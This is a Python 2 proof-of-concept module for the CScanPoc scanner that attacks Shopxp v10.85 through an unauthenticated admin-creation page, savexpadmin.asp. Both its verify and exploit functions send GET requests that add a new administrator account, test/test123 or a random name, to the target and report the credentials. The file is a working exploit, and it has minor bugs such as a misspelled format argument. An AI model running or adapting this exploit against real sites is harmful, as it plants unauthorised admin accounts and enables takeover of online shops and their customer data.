# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import random

class Vuln(ABVuln):
    vuln_id = 'Shopxp_0002'  # 平台漏洞编号，留空
    name = 'Shopxp-v10.85 CRSF攻击远程添加管理漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-07-23'  # 漏洞公布时间
    desc = '''
        savexpadmin.asp添加管理员页未进行身份验证。
    '''  # 漏洞描述
    ref = 'https://blog.csdn.net/oceanark/article/details/51902605'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'shopxp'  # 漏洞应用名称
    product_version = 'v10.85'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'c15020ee-2abc-4655-b419-8e16ae2c8c55'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-03'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            #增加用户名为test, 密码 test123
            payload = "/admin/savexpadmin.asp?action=add&admin2=test&password2=test123&Submit2=%CC%ED%BC%D3%B9%DC%C0%ED%D4%B1"
            verify_url = self.target + payload
            req = requests.get(verify_url)

            if req.status_code ==200 and "history.go(-1)" in req.content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            #生成随机注册信息
            randstr = '_' + str(random.randint(1,10000))
            info = 'admin' + randstr
            payload = "/admin/savexpadmin.asp?action=add&admin2={name}&password2={passwd}&Submit2=%CC%ED%BC%D3%B9%DC%C0%ED%D4%B1".format(
                name=info, passwd=info)
            verify_url = self.target + payload
            req = requests.get(verify_url)

            if req.status_code ==200 and "history.go(-1)" in req.content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞！添加的管理员用户名：{name}，密码：{passwd}'.format(
                        target=self.target, name=self.vuln.name, naem=info, passwd=info))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

if __name__ == '__main__':
    Poc().run()
